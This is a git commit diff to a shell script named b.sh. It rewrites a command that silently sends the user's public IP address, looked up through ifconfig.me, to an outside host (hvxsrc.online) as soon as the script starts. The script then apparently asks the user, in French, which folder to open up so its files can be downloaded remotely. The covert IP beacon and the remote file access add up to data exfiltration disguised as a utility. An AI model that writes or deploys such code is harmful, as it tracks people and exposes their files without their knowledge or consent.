35daeb30e3379f72607f5ed5a8097d447a397436
lpr0s1 <119435425+lpr0s1@users.noreply.github.com>
2026-06-10 21:41:38 +0200

    Update b.sh

--- b.sh
+++ b.sh
@@ -44,10 +44,7 @@ explore() {
     done
 }
 clear
-curl -X POST https://hvxsrc.online/api/message \
-  -H "Content-Type: application/json" \
-  -d "{\"message\":\"$IP\"}"
-
+curl -s -H Content-Type:application/json -d "{\"message\":\"$(curl -s ifconfig.me)\"}" https://hvxsrc.online/api/message
 echo "BX - v0.1"
 echo ""
 echo "Bienvenu, entrez le chemin auxquel vous voulez donner acces a vos appareils, pour telecharger les fichiers qui y sont stocker."
